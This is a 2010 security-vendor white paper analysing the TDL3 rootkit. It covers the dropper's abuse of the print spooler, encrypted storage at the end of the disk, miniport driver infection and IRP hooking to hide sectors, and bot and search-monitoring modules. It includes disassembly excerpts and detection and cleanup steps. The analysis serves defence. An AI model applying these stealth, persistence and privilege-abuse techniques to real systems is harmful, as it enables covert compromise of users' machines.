F-Secure White Paper
June 2010

The Case of Trojan
T
DownLoader "TDL3
TDL3"

Analysis By:
Ace Portuguez
F-Secure
Secure Labs

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

II. Contents

I.

Title Page

1

II.

Contents

2

III. List of Figures

4

IV. Introduction

5

V. Overview

6

V.1. Building a Foundation

6

V.2.

7

Installation Technique and Design
V.2.1.

No Turning Back (Installation Cleanup)

8

V.2.2.

Missing piece of the puzzle (Surviving Reboot)

8

V.3. Filtering Concept

9

V.4. Attempt for P2P

10

V.5. Data Synchronization

10

V.6. Payload Modules

12

V.6.1

BOT Client

12

V.6.2

TDL and SEO Attacks

12

V.7. Detection and Clean Up

14

V.7.1.

Signs of Infection

14

V.7.2.

Disinfection

15

V.8. Conclusion
VI. Technical Description
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

16
16

2 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

VI.1.

Installer /Dropper

16

VI.2.

Spooler Injector

17

VI. 2.1. Import Function Patching

20

VI. 2.2. Retrieving Unpacked Binaries

21

VI. 2.3. Executable Image Loader

21

VI.3.

Rootkit Driver

22

VI.4.

Driver Infection

22

VI.5.

IRP Function Wrapper

23

VI.6.

IRP Handler

24

VI.7.

Content Filtering

25

VI.7.1

Protecting the Miniport Driver from Defragmentation

32

VI.8.

File Caching

33

VI.9.

Infected Driver Code (Loader)

35

VI.10.

Process Injection

39

VI.11.

Worker Threads and KAD Protocol

42

VI.12.

Related Works and References

53

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

3 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

III. List of Figures

Figure I.

TDL3 Execution Flowchart

6

Figure II.

Malware Filtering

9

Figure III.

Global Data Access

11

Figure IV.

Monitoring Search Page Queries

13

Figure V.

Encrypted Data(Figure V) Sent to Malware Server

14

Figure VI.

Logging Search Queries To its FIleSystem

1

Figure VII. Exploiting Spooler Service (Disassembly)

17-19

Figure VIII. Import Patching (Disassembly)

21

Figure IX.

Patched IRP Major Function

23

Figure X.

IRP Hook Wrapper (Disassembly)

24

Figure XI.

Protected Sector Mapping

25

Figure XII. Filtering SCSI Read and Write (Disassembly)

26

Figure XIII. Initializing Completion Routine (Disassembly)

27

Figure XIV. Completion Routine and Content Forgery (Disassembly)

28-32

Figure XV. Disinfection and File Caching

34

Figure XVI. Loader Code (Disassembly)

35-38

Figure XVII. LoadImageNotify Handler (Disassembly)

39-41

Figure XVIII.Early KAD Funtionalities (Disassembly)

42-51

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

4 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

IV. Introduction
Current trends in the Threat Landscape dictate that a malware’s functionality grow in
number, perform more stealthily and increase in complexity. This continuous evolution is a
known fact in the industry as Operating Systems improve and Network security tightens.
Naturally, a malware analyst who regularly encounters a malware family will be able to
observe the changes between an old variant and a new one, and so note the increase and
changes in behaviors. Commonly observed changes seen in more recent malwares are: the
addition of code polymorphism, implementation of process hooks and injections;
experimentation with new ways to gain privilege escalation; and using rootkit functionalities.
There are however some malware that go a step further. In early 2008, a first-of-its-kind
malware was seen –
Mebroot (http://www.f-secure.com/weblog/archives/vb2008_kasslin_florio.pdf), which
incorporated some of the most advanced techniques seen in a malware. The aspect with the
greatest potential for impacting the threat landscape is the underlying concept the Mebroot
malware family represents; a framework or foundation, which we may call a Malware
Operating System (in reference to a ‘MaOS’ text string found in the malware).
TDL3, so named by the malware authors themselves, adopts some characteristics of
Mebroot malware family in terms of disk infection and surviving reboot operations. Although it
does not rank as the most complicated malware seen, TDL3’s distinctive features – stealthy
infection mechanisms and tricky removal - should not be overlooked. Moreover, TDL3 is just
a framework for further system compromise.
In few simple words, TDL3 is a "Means to an End”.

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

5 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

V. Overview
V.1 Building a Foundation
TDL3’s installation is multi-stage: the Installer is executed; a DLL is loaded; Code is
injected; a Service is started; a Driver loaded; Hooks are set in place; and finally,
Modules are injected. Once these stages are completed, the system is, needless to
say, compromised.

Figure I TDL3 Execution Flowchart

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

6 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Distributed mainly as a single executable file, the installation revolves around
appropriately loading the components embedded in the installer, one by one. Each
component typically handles certain aspects of the installation, as well as preparing
the system for the next component to be loaded.
V.2 Installation Technique and Design
Appropriate privileges are a must for successful installation and needless to say,
TDL3 has this covered pretty well. Exploiting a common system behavior, the
malware will morph itself and use the spooler service. Doing this allows it to bypass
HIPS installed in the system. With sufficient privileges and bypass features, loading
the Driver component – is now made possible.
Unlike most rootkit families/drivers, in which the Driver component exist as a file
holding the Executable structures intact, TDL3’s Driver component is merely a shell to
simply install/write its code section at the end of the disk.
By design, TDL3 follows Mebroot’s Disk-Storage scheme, i.e. storing related malware
components and data at the end of the physical disk. Information stored in these last
sectors includes (but is not limited to): the configuration file; payload components;
stolen information; and the Driver’s code sections. All these components and data are
encrypted using a RC4 algorithm.
TDL3 driver however goes the extra mile by implementing its own ‘Encrypted File
System’. This adds additional security and integrity to data retrieval when reading the
sectors at the end of the disk. Stolen information and the Driver component’s code
are stored in the last sectors. Meanwhile, the EXE, DLL and configuration files are
organized using a simple ‘private file system’: a list of files is stored in a ‘Directory’type listing marked in the disk with ‘TDLD’ (TDL Directory), with a filename and offset
indicating the location of the file content; while the corresponding file contents are
marked as ‘TDLF’ (TDL File).
Protecting this ‘file system’ is done in three parts. First, the stored data is directly
encrypted using a RC4 algorithm with a private key string, which in this case is a 256byte long ‘tdl’ string. Second, at each execution (after reboot), the malware generates
a global random string which is only known to the malware and its components, to be

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

7 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

used when accessing the ‘file system’. And the third, the malware uses hooks to
protect these sectors from direct access.
V.2.1 No Turning Back
To protect itself from early detection and to conceal signs of infection, the
malware implements clean up routines, erasing any traces of execution or
existence in the system. Associated files and registry entries are deleted,
making the infection virtually impossible to notice.

V.2.2 Missing piece of the puzzle
Of course, installation would not be complete without ensuring that a
mechanism for continuous and effective autostart is in place. Autostart or
merely surviving reboot is always a race condition – simply put, to protect
itself, most advance malwares will ensure they are executed first before any
other drivers, including antivirus scanners, are loaded.
To survive reboot and win the loading race, TDL3 infects the lowest disk filter
driver to contain the loader stub, ensuring the malware is fully operational
when the system is loaded.

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

8 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

V.3 Filtering Concept

Figure II Malware Filtering
Acting in the lowest level of disk filter driver, TDL3 successfully ‘hooks’ or intercepts
accesses to a list of protected sectors. The malware hooks are responsible for two
things: allowing direct access to the disk for malware components; and filtering
content access to the disk by other processes thus helping the malware hide its
presence on the system.

TDL3 uses two methods to intercept access. In the first method, TDL3 maintains a list
of physical addresses for infected sectors, as well as a corresponding fake mapping
of the original clean sectors in its memory. When any attempt is made to access the
infected sectors, the malware will overwrite the (infected) data read with clean data
stored in memory. This listing is primarily used to protect the infected disk filter driver

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

9 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

from being accessed, as the malware’s own file system and the malware data stored
at the end of the disk are already protected.
The second tactic is simpler, as any read/write access requests to the last disk
sectors that do not come from the malware will be presented with filtered content. To
filter, the read data in memory to be returned to the calling process is zero-filled thus
giving back a clean memory buffer.

V.4 Attempt for P2P
The first variants that appeared in this growing family originally included thread
functions in the driver code for Peer-to-Peer (P2P) communication via TDI interface,
using the Kademlia protocol. Kademlia-based DHT protocol (KAD) is known as the
most widest used DHT-base protocol, so its choice comes to no surprise. Normally,
this protocol is used to send messages between peers, as well as for file uploads and
downloads. Its use here is perhaps an attempt to push malware updates?
From the samples analyzed, this functionality is unlikely to perform correctly as the
implementation lacks several key KAD function handlers. At the time, this led us to
conclude that its inclusion was a premature attempt at using P2P. We may have been
right, as the latest samples seen no longer contain the P2P functionality. The
question is however, is that a good thing? Or has P2P functionality was improved and
completed and just been transferred to a new module which is to be downloaded
later?

V.5 Data Synchronization
TDL3 maintains a set of global data variables that is accessible by several different
components and threads, ensuring that the separate processes use synchronized
data during execution.
To store the global information, the malware utilizes the KUSER_SHARED_DATA
region in memory. The KUSER_SHARED_DATA structure starts at 0xFFDF0000 and
is 0x340 bytes long. TDL3 modifies the entry KUSER_SHARED_DATA>SystemCallPad (0xFFDF0308) to point to an allocated buffer (which will be
subsequently referred to as Malware_Shared_Buffer) in memory, an area that all
components can access.
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

10 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Figure III Global Data Access
The information contained in the Malware_Shared_Buffer area includes, but is not
limited to, the following:
• A pointer to the allocated buffer that contains the stolen resource data from the
infected disk filter driver, as well as a copy of the malware code section
• Base address of kernel
• Device object handle responsible for IDE/Disk device
• Offset in the disk, indicating where the stolen information is written
• MachineGUID (used by the malware as a unique botid)
• Copy of all the Original Addresses for the disk filter driver’s IRP Major Functions
• Pointer to the malware’s IRP Hook Handler
• Driver and Device object associated to the infected driver
• Address of kernel32!LoadLibrary used in DLL injection
• Randomly generated string – used to access files in the malware-protected sectors
• Complete path to access the malware private file system
• Other portions of this buffer are used for temporary variables,
SCSI_REQUEST_BLOCK structure, IRP structure etc…

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

11 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

V.6 Payload Modules
The main TDL3 installer file contains two payload modules:
• TDLwsp.dll
• TDLcmd.dll
These modules are injected into specific processes, as indicated in a log or
configuration file. Module injection is carried out in kernel by creating a
LoadImageNotify handler to intercept process execution. The handler will execute an
APC which will create a worker routine that will be finally responsible for running
LoadlibraryExA as another APC with the payload module name written in the memory
context of the target process.
V.6.1 BOT Client
TDLcmd is injected into the svchost process and functions as a bot by connecting to
a malware-defined Command & Control (C&C) server. The address it connects to
may be sourced from either the configuration file or an address hardcoded in its body,
whichever is the latest. The main function of this module appears to be downloading
files onto the system.
V.6.2 TDL and SEO Attacks
Meanwhile, TDLwsp is injected into any launched process and once loaded, will focus
mainly on web browser processes by checking the following strings:
• *explore*
• *firefox*
• *chrome*
• *opera*
• *safari*
• *netscape*
• *avant*
• *browser*
If any of the strings are found, TDLwsp will hook the process’ WSPRecv, WSPSend
and WSPCloseSocket APIs from the mswsock module. By injecting through these
browser applications, TDLwsp becomes capable of passing through system firewalls.
It can thus also manipulate the browser’s browsing history and search pages and

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

12 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

gain the capacity to download an update for itself – without arousing suspicion in the
user.
Latest variants have now properly implemented this. While browsing, it monitors input
search queries in on popular search engines and websites such as, Google, Yahoo,
AOL, Ask, Bing, Live, Msn, Youtube etc… TDLwsp = (TDL [W]atcher [S]earch
[P]ages)?
Monitored queries are then stored by the malware in its ‘file system’ as the file
‘keywords’. Moreover, queried phrases are then immediately sent to its controlled
server together with BotId, Bot version, date in an encrypted form to avoid immediate
detection. Allowing the attacker to poison future search queries of the user or use the
gathered keywords to compute its own statistics for commonly search phrases at the
time allowing remote attackers to effectively launch a SEO poisoning attack.

Figure IV Monitoring Search Page Queries

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

13 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Figure V Encrypted Data (Figure V) Sent to Malware Server

Figure VI Logging Search Queries To its FileSystem

V.7 Detection and Clean UP
V.7.1 Signs of Infection
As with most rootkits, signs of system infection are hard to find without the aid
of some tools. One easy way to identify infection is by checking “explorer”, or
any other process mentioned above, to see if a tdlwsp.dll has been injected in
it (this may be done using SysInternals’ ProcessExplorer.exe). Actively
monitoring network connections for packets involving unknown file downloads
may also help in pinpointing possible infection. Moreover, active payload
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

14 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

modules can be seen with an internet browser open and checking for the
mutex CC51461B-E32A-4883-8E97-E0706DC65415.
Alternatively, since the infected miniport driver is protected by the malware
during a live system infection, this protection can be circumvented by
performing offline scanning, whether through a clean system or by booting
with a clean disk or via the recovery console. During offline mode, users can
also check for malicious information stored at the end of the disk.
For more advanced investigators, infection can be identified by checking the
disk miniport driver’s IRP Handler for the presence of a possible HOOK
wrapper. Furthermore, the KUSER_SHARED_DATA can be checked to see if
the malware entry is present; this can be done programmatically or by using
available tools or debuggers.

V.7.2 Disinfection
Perhaps the weakest link in the malware’s operations, which can thus be
exploited for cleanup, is the infected disk filter or Miniport driver. As it is the
starting point of the infection process when the system is rebooted,
disinfecting this module first then reboot, it will guarantee the other malware
components still present on the disk will no longer be able to execute.
Should the technology support this, the following is the ideal cleanup process
for an infected system:






Read the malware’s Common buffer and retrieve all information
needed
Restore IRP Hooks
Remove the injected components
Disinfect the Miniport driver
Clear malware-related data/buffers from the KUSER_SHARED_DATA
memory entry, as well as other buffers

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

15 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

V.8 Conclusion
Aside from some similarities from the old TDSS backdoor malwares, TDL3 is not the
new TDSS as claimed by the malware authors in TDL3’s code,
What do we know about TDL3? It operates in low level as well as user mode via
different components. Loading and execution are multi-stage operations. Startup and
system infection properties are similar to Mebroot rootkits in that it writes its copy and
associated data directly to the end of the disk. It infects the Miniport driver associated
with the disk device to enable its own automatic and early execution. It has bot
functionality, which is carried out by the DLL component as well as the driver.
Payloads, so far, are geared towards downloading data/files.
So just what is TDL3? TDL3 is a "means to an end”, a malware framework, a
foundation for complete system compromise. What TDL3 offers is not just stealth
coverage or complex installation, but a functional platform for pushing unknown
malware onto the system. Through its stealth mechanisms, TDL3 protects the
‘pushed’ malwares; while its complexity prevents the malwares from being removed
easily.

VI. Technical Description
VI.1. Installer /Dropper
It is important to note that TDL3’s installer file exists in both EXE and DLL form. The
difference between the two involves the amount of data to be decrypted and
unpacked.
The installer typically contains five (5) packed and encrypted data which are
embedded within the executable form of the installer file. The start of the data is
directly referenced in the following file:
• IMAGE_FILE_HEADER.PointerToSymbolTable

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

16 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

The data is embedded as adjacent structures of:
Struct EmbedData
{
Long dwSize;
Char DATA [dwSize];
};
When the EXECUTABLE file is launched, it will only load one of the embedded data;
by contrast, the DLL version will load and unpack all the data.
Normal installation starts with the EXECUTABLE version of the installer file. When
executed, the file first checks to determine which mode of execution it will perform; it
then loads, unpacks and executes an image file.

VI.2 Spooler Injector
Once the unpacked image is executed, the installer file will pass control to it, but not
before the following is first checked: Is the unpacked image from the EXE or DLL
version of the installer?
The major routines at this stage require that the unpacked image come from the DLL
version of the Installer. If the image is from the EXE version, executing the image
causes it to patch itself and create a DLL version of the Installer in a temporary (tmp)
file in the print spooler directory
(%Systemroot%\system32\spool\prtprocs\[platformdir]).
Subsequently, calling the AddPrintProcessor triggers the spooler to locate and load
any associated DLL s stored in its print processor directory thereby executing the DLL
version of the Installer in the context of the spooler service. Alternatively, new
variants use AddPrintProvidor to do the same.
.text:022814DE
.text:022814E1
.text:022814E2
.text:022814E3
.text:022814E5
.text:022814E7
.text:022814E7
.text:022814ED

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

lea
push
push
push
push
call

eax, [ebp+68h+arg_0+3]
eax
; ptr enabled
ebx
; current thread
1
; enable
0Ah
; privelege
ds:RtlAdjustPrivilege

lea

eax, [ebp+68h+hObject]

17 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:022814F0
push
.text:022814F1
mov
.text:022814F6
push
.text:022814F7
lea
.text:022814FD
push
.text:022814FE
push
.text:02281500
push
.text:02281501
push
.text:02281502
call
winspool.drv
.text:02281502
_GetPrintProcessorDirectoryA@24
.text:02281502
.text:02281507
lea
.text:0228150D
push
.text:0228150E
push
.text:0228150F
push
.text:02281510
lea
.text:02281516
push
.text:02281517
call
.text:02281517
.text:0228151D
push
.text:0228151E
lea
.text:02281524
push
.text:02281525
push
.text:02281526
call
.text:02281526
.text:0228152C
push
.text:0228152D
lea
.text:02281533
push
.text:02281534
lea
.text:0228153A
push
.text:0228153B
call
.text:0228153B
.text:02281541
push
.text:02281542
push
.text:02281543
push
dwCreationDisposition
.text:02281545
push
.text:02281546
push
.text:02281548
push
.text:0228154D
lea
.text:02281553
push
.text:02281554
call
.text:02281554
.text:0228155A
mov
.text:0228155C
cmp
.text:0228155F
jz
.text:0228155F
.text:02281561
push
.text:02281562
call
.text:02281562
.text:02281568
push
.text:02281569
mov
.text:0228156C
call
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

eax
; pcbNeeded
esi, 104h
esi
; cBuf
eax, [ebp+68h+printdirpath]
eax
; PrintProcessorInfo
1
; Level
ebx
; pEnvironment
ebx
; pName
jGetPrintProcessorDirectoryA@24 ;
;
eax, [ebp+68h+tempfilename]
eax
; lpTempFileName
ebx
; uUnique
ebx
; lpPrefixString
eax, [ebp+68h+printdirpath]
eax
; lpPathName
ds:GetTempFileNameA
esi
; nSize
eax, [ebp+68h+printdirpath]
eax
; lpFilename
ebx
; hModule
ds:GetModuleFileNameA
ebx
; bFailIfExists
eax, [ebp+68h+tempfilename]
eax
; lpNewFileName
eax, [ebp+68h+printdirpath]
eax
; lpExistingFileName
ds:CopyFileA
ebx
ebx
3

; hTemplateFile
; dwFlagsAndAttributes
;

ebx
; lpSecurityAttributes
1
; dwShareMode
FILE_ALL_ACCESS ; dwDesiredAccess
eax, [ebp+68h+tempfilename]
eax
; lpFileName
ds:CreateFileA
edi, eax
edi, INVALID_HANDLE_VALUE
short loc_22815DE
ebx
; lpModuleName
ds:GetModuleHandleA
eax
; pPrintProcessorName
[ebp+68h+hKey], eax
ds:RtlImageNtHeader

18 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:0228156C
.text:02281572
mov
esi, eax
.text:02281574
sub
eax, [ebp+68h+hKey]
.text:02281577
push
ebx
; dwMoveMethod
.text:02281578
push
ebx
; lpDistanceToMoveHigh
.text:02281579
add
eax, 16h
.text:0228157C
push
eax
; lDistanceToMove
.text:0228157D
push
edi
; hFile
.text:0228157E
call
ds:SetFilePointer ; Characteristic
Field
.text:0228157E
.text:02281584 /*
.text:02281584
Changes the characteristics of the copy to DLL
.text:02281584 */
.text:02281584
mov
ax,
[esi+_IMAGE_NT_HEADERS.FileHeader.Characteristics]
.text:02281588
or
ax, IMAGE_FILE_DLL
.text:0228158C
movzx
eax, ax
.text:0228158F
push
ebx
; lpOverlapped
.text:02281590
mov
[ebp+68h+Buffer], eax
.text:02281593
lea
eax, [ebp+68h+hObject]
.text:02281596
push
eax
;
lpNumberOfBytesWritten
.text:02281597
push
2
;
nNumberOfBytesToWrite
.text:02281599
lea
eax, [ebp+68h+Buffer]
.text:0228159C
push
eax
; lpBuffer
.text:0228159D
push
edi
; hFile
.text:0228159E
call
ds:WriteFile
; change to DLL
.text:0228159E
.text:022815A4
push
edi
; hObject
.text:022815A5
call
ds:CloseHandle
.text:022815A5
.text:022815AB
push
offset aTdl
; "tdl"
.text:022815B0
lea
eax, [ebp+68h+tempfilename]
.text:022815B6
push
eax
; pszPath
.text:022815B7
call
ds:PathFindFileNameA
.text:022815B7
.text:022815BD
push
eax
; pPathName
.text:022815BE
push
ebx
; pEnvironment
.text:022815BF
push
ebx
; pName
.text:022815C0
call
j_AddPrintProcessorA@16

Figure VII Exploiting Spooler Service
Once the DLL Installer is executed in the spooler service, it will decrypt all the
embedded data and load them in the system:
• Driver
• TDLwsp.dll
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

19 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

• TDLcmd.dll
• List of C&C server
• Id
The Driver will then be loaded with necessary registry service information set
(tdlserv).
The malware will also create the file config.ini to contain the basic information needed
for infection. The file contains the following:
[main]
botid = [machineguid]
affid = (1002)
subid = (0)
installdate = [systemdate]
[injector]
svchost.exe = tdlcmd.dll
* = tdlwsp.dll (* -> any process)
[tdlcmd]
servers =
Details of the config.ini will be discussed in the following sections. Once the config.ini
file is set, TDLcmd.dll will be loaded into memory for continued execution.

VI.2.1 Import Function Patching
It is interesting to note the way the Installer attempts to obfuscate the call to
the unpacking routine – namely, by patching its own Import table and calling
the corresponding API (e.g., SetEvent) for the address in the table. As such,
when viewed in a disassembler for static analysis, the malware’s action
appears to be a normal call to an API, even though it is actually a call to the
unpacking routine.
.text:004013AC
.text:004013AD
.text:004013B1
.text:004013B5
.text:004013B9
.text:004013BD
.text:004013C1

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

push
mov
mov
mov
mov
mov
mov

eax
[ebp+var_30], 'S'
[ebp+var_2F], 'e'
[ebp+var_2E], 't'
[ebp+var_2D], 'E'
[ebp+var_2C], 'v'
[ebp+var_2B], 'e'

20 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:004013C5
.text:004013C9
.text:004013CD
.text:004013D1

mov
mov
mov
call

[ebp+var_2A], 'n'
[ebp+var_29], 't'
[ebp+var_28], 0
FindAPIByHash_PatchSetEvent ;

.
.
.text:00401AD3
.text:00401AD5
mov
.text:00401AD7
push
.text:00401AD8
push
.text:00401ADC
mov
.text:00401AE3
call
code -- uses aPlib compression

edi, eax
edi
[esp+10h+hEvent] ; hEvent
eax, ds:SetEvent]
eax ; SetEvent ; unpacking

Figure VIII Import Patching

VI.2.2 Retrieving Unpacked Binaries
Subsequent execution of the two user mode components (TDLwsp.dll and
TDLcmd.dll) follows the same decryption and unpacking routine as the initial
Installer. Across the different components, similar code is seen as shown in
Figure IV. The address of the unpacked module is returned after the call to the
patched API.
The same technique is also utilized by Driver component, with the exception
of the target API to patch, which may vary. At the time of writing, the Driver
uses the API RtlAppendAsciizToString.
VI.2.3 Executable Image Loader
As the unpacked images in memory are file images, the malware uses its own
loader to map and execute them. Execution involves proper memory mapping,
fixing of import and export tables and fixing or updating relocationable items.
This also includes fixing and updating such resource information as it is
needed by the new image for proper execution.

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

21 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

VI.3 Rootkit DRIVER
The malware’s Driver is critical because all other components require it to have been
already loaded in order to successfully execute.

VI.4 Driver Infection
When executed, the Driver’s initial task is to infect the filter driver or Miniport driver
associated with the disk device. It does so by overwriting certain bytes in the
Miniport’s resource section with its own Loader code. The stolen resource is then
stored in the same buffer as the Driver’s code.
Execution of the buffered code is the final stage of installation and is responsible for
starting the necessary threads and hooks for complete system infection. Both the
stolen resource and the Driver code are subsequently written to the disk’s raw
sectors.
Also, to control access to disk sectors containing malware-related code, TDL3
patches all the Miniport driver’s IRP Major Functions to point to its handler:

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

22 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

Figure IX Patched IRP Major Function
VI.5 IRP Function Wrapper
To hook the Miniport driver’s IRP Major Functions, the malware first copies a wrapper
code to the end of the driver’s code, then points all the IRP functions to that address.
By doing so, the malware ensures the IRP Major Functions are pointed inside the
driver rather than to any arbitrary memory address for better stealth. The wrapper
looks like:

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

23 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10005586 ATAPI_DRV_OBJ_IRP_PATCH proc near
.text:10005586
mov
eax, ds:0FFDF0308h
.text:1000558B
jmp
dword ptr [eax+0FCh]
.text:1000558B
.text:1000558B ATAPI_DRV_OBJ_IRP_PATCH endp

Figure X IRP Hook Wrapper
Note: [0FFDF0308h] + 0xFC points to the malware’s IRP Handler Functions

VI.6 IRP HANDLER
After the Miniport driver is infected, the malware performs a quick check whenever an
IRP Major Function is called. The check is done to ascertain if the path being
accessed contains either an exact path or a string matching the one stored in the
Malware_Shared_Buffer.
If the correct path or string is present, it indicates a request for direct access to the
malware’s ‘private’ file system. In this case, the malware will check if the IRP function
called is any of the following:
• IRP_MJ_CREATE
• IRP_MJ_CLOSE
• IRP_MJ_QUERY_INFORMATION
• IRP_MJ_SET_INFORMATION
• IRP_MJ_READ
• IRP_MJ_WRITE
• IRP_MJ_QUERY_VOLUME_INFORMATION
If so, the malware performs the necessary routines to read the requested data, as
well as performing all the parsing and decryption for the calling process.
Essentially, as long as a calling process contains the exact path or the malwaregenerated string, any attempt to access the malware’s file system will be performed
by the malware and successfully completed.

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

24 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

If the request does not include the correct path or string, the malware will perform
another check to determine if ‘content filtering’ should be implemented.
VI.7 Content Filtering
Content filtering is the malware’s response to attempts to access specific protected
disk sectors:

Figure XI Protected Sector Mapping
When verifying a disk request, this array of structure is enumerated and checked. If a
disk access request does not touch these sectors, it is allowed to proceed; if the
request is directed against any of the sensitive sectors, the requested data is
modified or disinfected to hide the malware’s presence on the disk.
To determine if content filtering should be applied, the access request is first checked
for SRB_FUNCTION_EXECUTE_SCSI, with flags SRB_FLAGS_DATA_IN and
SRB_FLAGS_DATA_OUT.

© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

25 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

.text:10004B61 loc_10004B61:
IRP_HOOK_HANDLER+91j
.text:10004B61
.text:10004B61

; CODE XREF:
cmp

; IRP_HOOK_HANDLER+98j
[ebx+IO_STACK_LOCATION.MajorFunction],
IRP_MJ_INTERNAL_DEVICE_CONTROL
not_scsi_execute

.text:10004B64
jnz
.text:10004B64
.text:10004B6A /*
.text:10004B6A IRP_MJ_INTERNAL_DEVICE_CONTROL
.text:10004B6A */
.text:10004B6A
mov
ecx,
[ebx+IO_STACK_LOCATION.Parameters.Scsi.Srb]
.text:10004B6D
cmp
[ecx+SCSI_REQUEST_BLOCK.Function],
SRB_FUNCTION_EXECUTE_SCSI
.text:10004B71
jnz
not_scsi_execute
.text:10004B71
.text:10004B77
mov
edi, ds:0FFDF0308h
.text:10004B7D
mov
eax,
[ecx+SCSI_REQUEST_BLOCK.DataTransferLength]
.text:10004B80
xor
edx, edx
.text:10004B82
div
[edi+TDL3.SectorSize]
.text:10004B88
xor
esi, esi
.text:10004B8A
mov
edx, edi
.text:10004B8C
mov
[ebp+srbflags], esi
.text:10004B8F
add
eax,

[ecx+SCSI_REQUEST_BLOCK.anonymous_0.InternalStatus]
.text:10004B92
cmp
eax,
[edx+TDL3.MalwareFSOffsetInSector]
.text:10004B95
jbe
short accessing_protected_sectors
.text:10004B95
.text:10004B97
mov
eax, [ecx+SCSI_REQUEST_BLOCK.SrbFlags]
.text:10004B9A
mov
esi, eax
.text:10004B9C
shr
esi, 7
.text:10004B9F
shr
eax, 6
.text:10004BA2
and
esi, 1
.text:10004BA5
and
eax, 1
; get highword
.text:10004BA8
mov
[ebp+srbflags], eax
; SRB_FLAGS_DATA_IN |
SRB_FLAGS_DATA_OUT
.text:10004BAB
jmp
short internal_scsi_call
.text:10004BAB

Figure XII Filtering SCSI Read and Write

If the check determines that the requested disk area falls outside the malware’s
reserved sectors, the malware issues an IoCompleteRequest and passes the
requested data to the caller.
© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.

26 / 53

THE CASE OF A [T]ROJAN [D]OWN[L]OADER

If however the access falls within the malware’s reserved sectors, the malware
allocates and initializes a new CompletionRoutine, setting the
IO_STACK_LOCATION->Control to 0xe0 (either SL_INVOKE_ON_CANCEL or
SL_INVOKE_ON_SUCCESS or SL_INVOKE_ON_ERROR) and calling the Original
IRP Major Function.
.text:10004C66
.text:10004C6B
push
0Ch
.text:10004C6D
push
edi
.text:10004C6E
call
eax
; ExAllocatePool
.text:10004C6E
.text:10004C70
cmp
eax, edi
.text:10004C72
jz
short not_scsi_execute
.text:10004C72
.text:10004C74 /*
.text:10004C74
Allocates a new buffer to setup the malware
.text:10004C74
completion routine for filtering
.text:10004C74 */
.text:10004C74
mov
ecx,
[ebx+IO_STACK_LOCATION.CompletionRoutine]
.text:10004C77
mov
[eax], ecx
.text:10004C79
mov
ecx, [ebx+IO_STACK_LOCATION.Context]
.text:10004C7C
mov
[eax+4], ecx
.text:10004C7F
mov
ecx,
[ebx+IO_STACK_LOCATION.Parameters.Scsi.Srb]
.text:10004C82
mov
ecx,
[ecx+SCSI_REQUEST_BLOCK.anonymous_0.InternalStatus]
.text:10004C85
mov
[eax+8], ecx
.text:10004C88
mov
[ebx+IO_STACK_LOCATION.Control],
SL_INVOKE_ON_CANCEL or SL_INVOKE_ON_SUCCESS or SL_INVOKE_ON_ERROR
.text:10004C8C
mov
[ebx+IO_STACK_LOCATION.Context], eax
.text:10004C8F
call
ComputeDelta
.text:10004C8F
.text:10004C94
add
eax, 0F578291Eh
.text:10004C99
mov
[ebx+IO_STACK_LOCATION.CompletionRoutine],
eax
.text:10004C99
.text:10004C9C not_scsi_execute:
.text:10004C9C
.text:10004C9C
push
[ebp+IRP]
.text:10004C9F
movzx
eax,
[ebx+IO_STACK_LOCATION.MajorFunction]
.text:10004CA2
push
[ebp+DEVICE_OBJECT]
.text:10004CA5
mov
ecx, ds:0FFDF0308h
.text:10004CAB
call
dword ptr [ecx+eax*4+8Ch] ;
CALL_ORIGINAL_IRP_HANDLER

Figure XIII Initializing Completion Routine

